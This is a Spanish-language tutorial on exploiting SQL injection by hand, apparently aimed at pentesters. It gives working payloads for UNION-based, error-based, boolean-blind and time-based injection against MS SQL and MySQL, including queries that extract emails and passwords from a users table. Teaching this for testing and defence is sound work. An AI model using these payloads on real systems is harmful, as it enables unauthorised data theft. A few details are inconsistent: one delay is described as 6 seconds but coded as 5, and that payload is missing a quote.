# Técnicas manuales y mejores prácticas para explotar inyecciones SQL

* Una buena recomendación a la hora de explotar una vulnerabilidad de inyección SQL es utilizar comentarios, concretamente, para comentar cualquier código SQL que siga al punto de inyección:
  * `#`: el símbolo hash.

    ```sql
    SELECT name, description, price FROM products WHERE status='new' or '1'='1' #' AND taxable = true;
    ```

  * `-- `: dos guiones seguidos de un espacio.

    ```sql
    SELECT name, description, price FROM products WHERE status='new' or '1'='1' -- ' AND taxable = true;
    ```

    Dado que un comentario en sí mismo se compone de dos guiones y un espacio, es una buena práctica agregar un tercer guión al final (es decir, `-- -`) porque la mayoría de navegadores eliminan automáticamente los espacios finales en la URL:

    ```url
    products.php?status=new' or '1'='1'; -- -
    ```

## Inyecciones SQL in-band

* Debido a que en las inyecciones SQL in-band el resultado de la explotación se incluye directamente en la página de respuesta de la aplicación web vulnerable, estos tipos de inyección SQL suelen ser los que requieren el menor esfuerzo para ser explotados.

### Inyecciones SQL basadas en UNION

* Al explotar inyecciones SQL basadas en UNION, el número de campos de la segunda sentencia `SELECT` debe coincidir con el **número de campos** de la primera sentencia (y original), tal y como sucede con carga útil SQL `new' UNION SELECT username, email, password FROM users; -- -` en el siguiente ejemplo:

  ```sql
  SELECT name, description, brand FROM products WHERE status='new' UNION SELECT username, email, password FROM users; -- -' AND taxable = true;
  ```
  
  * Para lograr este cometido sin conocer la cantidad de campos seleccionados originalmente, es posible seleccionar un solo campo e ir aumentando la cantidad de campos hasta que se llegue a construir una consulta válida:

    ```sql
    UNION SELECT NULL; -- -
    ```

    ```sql
    UNION SELECT NULL, NULL; -- -
    ```

    ```sql
    UNION SELECT NULL, NULL, NULL; -- -
    ```

* Dependiendo del DBMS, los **tipos de campos** de la segunda declaración `SELECT` en un contexto `UNION` deben coincidir con los de la primera declaración. Además, hay que tener en cuenta que es posible que algunos campos seleccionados en la consulta SQL no se incluyan en la página de salida, aunque siguen siendo parte de la consulta.
  
  * Para conseguirlo, se puede empezar por sustituir los campos `NULL` por tipos de datos representativos hasta que se construya, de nuevo, una consulta válida:

    ```sql
    UNION SELECT 'a', NULL, NULL; -- -
    ```

    ```sql
    UNION SELECT 'a', 1, NULL; -- -
    ```

    ```sql
    UNION SELECT 'a', 1, 'a'; -- -
    ```

* Se recomienda utilizar el operador `UNION ALL` para evitar el efecto de una eventual cláusula `DISTINCT` en la consulta original de la aplicación web.
* Finalmente, para realizar con éxito la inyección, es necesario encontrar una forma **de conocer o inferir la estructura de la base de datos** en términos de nombres de tablas y columnas.

### Inyecciones SQL basadas en errores

* La finalidad en este caso es forzar al DBMS a mostrar un error que incluya información sensible. Por ejemplo, una simple carga SQL como `new' OR user_name()=1;-- -`, la cual intenta convertir un valor de cadena (es decir, el usuario actual de la base de datos) a entero, podría hacer el trabajo:

  ```sql
  SELECT name, description, brand FROM products WHERE status='new' OR user_name()=1; -- - AND taxable = true;
  ```

* A continuación se muestran algunas cargas útiles para DBMS específicos que tienen como objetivo recuperar la versión de la bases de datos mediante los propios errores.

#### Usando CAST en MS SQL server

* Inyección del payload:

  ```sql
  new' or 1 in (SELECT TOP 1 CAST (@@version as varchar(4096)); -- -
  ```

  Potencial error obtenido en la página de salida:

  ```
  [Microsoft][SQL Server Native Client 10.0][SQL Server] Conversion failed when converting the varchar value 'Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (x64) Jun 28 2020 08:36:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)' to data type int.
  ```

* Inyección del payload para obtener el valor del campo `email` del primer registro de la tabla `users` de la base de datos `ecommercedb`:

  ```sql
  new' or 1 in (SELECT TOP 1 CAST (email as varchar(4096)) FROM ecommercedb..users; -- -
  ```

#### Usando concat() y GROUP BY en MySQL

* Inyección del payload:

  ```sql
  new' or 1 in (SELECT count(*), concat(version(),floor(rand(0)*2)) as x FROM information_schema.tables GROUP BY x); -- -
  ```

  Potencial error obtenido en la página de salida:

  ```
  ERROR 1062 (23000): Duplicate entry '5.5.43-0+deb7u11' for key 'group_key'
  ```

* Payload de inyección para obtener todas las tablas de la base de datos `ecommercedb`:

  ```sql
  new' AND (SELECT 1 FROM (SELECT count(*), concat((SELECT distinct(table_name) FROM information_schema.tables WHERE table_schema="ecommercedb" LIMIT 1,1)," - ", FLOOR(RAND(0)*2)) B FROM information_schema.tables GROUP BY B) C) #
  ```
  
* Payload de inyección para obtener el valor del campo `email` del primer registro de la tabla `users` de la base de datos `ecommercedb`:

  ```sql
  cars' AND (SELECT 1 FROM (SELECT count(*), concat((SELECT email FROM ecommercedb.users limit 0,1)," - ", FLOOR(RAND(0)*2)) B FROM information_schema.tables GROUP BY B) C) #
  ```

## Inyecciones SQL inference/blind

* Una diferencia significativa entre las inyecciones SQL in-band/error-based respecto las blind es la cantidad de solicitudes que se deben realizar para estas últimas (y el tiempo requerido en consecuencia).
* Esa es la razón por la que es difícil lograr una explotación manual inyecciones SQL blind. En este sentido, los pentesters tienden a crear sus propios scripts de explotación o bien a utilizar herramientas automatizadas como [sqlmap][1].

### Inyecciones SQL boolean-based

* El objetivo aquí es hacer preguntas `TRUE` o `FALSE` a la base de datos y determinar el resultado en función de la respuesta de la aplicación (por ejemplo, cambia el texto de la página web si la condición es `TRUE` frente a si es `FALSE`).
* Para este propósito, el tipo de preguntas a realizar pueden ser como las siguientes:
  * ¿Para el primer registro de la tabla `Users`, el valor del campo `username` tiene una longitud de 3 caracteres?
    * Si no es así, ¿tiene una longitud de 4? de 5? de 6?
  * Una vez determinada la longitud, ¿Es la primera letra una "a"?
    * Si es cierto, se procede a preguntar por la segunda letra del nombre de usuario.
    * Si es falso, entonces se sigue preguntando por la misma posición pero con la siguiente letra del alfabeto y así sucesivamente hasta que sea cierto.
* A continuación se encuentran algunos payloads para DBMSs específicos que son útiles para realizar este tipo de consultas.

#### Usando length() y ascii() en MySQL

* Intentando averiguar la longitud de un campo:

  ```sql
  ' or (length((SELECT password FROM users WHERE id=1)) > 5 )
  ```

  A modo recordatorio:

  * `length()` devuelve la longitud de la cadena.
  
* Una vez conocida la longitud de un campo, se puede proceder a adivinar la primera letra::

  ```sql
  ' or (ascii(substring((SELECT password FROM users WHERE id=1),1,1)) > 97 )
  ```

  A modo recordatorio:

  * `ascii()` devuelve el valor ASCII de un carácter.

#### Usando user() and substring() en MySQL

* Intentando averiguar la primera letra del nombre del usuario actual de la base de datos:

  ```sql
  ' or substr(user(), 1, 1) = 'a
  ```

  Hasta que la consulta no sea cierta, se continua probando con las sucesivas letras:

  ```sql
  ' or substr(user(), 1, 1) = 'b
  ```

  A modo recordatorio:

  * `user()` devuelve el nombre del usuario actual que utiliza la base de datos.
  * `substring()` devuelve una subcadena del argumento dado. Utiliza tres parámetros: la cadena de entrada, la posición de la subcadena y su longitud.

* Una vez se encuentra la primera letra, se puede pasar a la segunda:

  ```sql
  ' or substr(user(), 2, 1) = 'a
  ```

### Inyecciones SQL blind basadas en tiempo

* En este caso, el tiempo se utiliza para inferir una condición `TRUE` a partir de una condición `FALSE`.
* Seguidamente se encuentran algunas cargas útiles que son prácticas para ciertos DBMS.

#### Usando waitfor en MS SQL

* Si es `TRUE`, el DBMS se retrasará 6 segundos:

  ```sql
  if (SELECT user) = 'ecommerce' waitfor delay '0:0:5
  ```

#### Usando sleep() y benchmarck() en MySQL

* Si es `TRUE`, el DBMS se retrasará 10 segundos:

  ```sql
  select if((SELECT database()="ecommercedb"), sleep(10), null); -- -
  ```

  ```sql
  select if((SELECT version() like "5%"), sleep(10), null); -- -
  ```

* Ejecutará la función MD5(1) 10000000 veces si la cláusula `if` devuelve `TRUE`:

  ```sql
  if exists (SELECT * FROM users WHERE username = 'johndoe') BENCHMARK(10000000, MD5(1))
  ```

[1]: https://sqlmap.org/
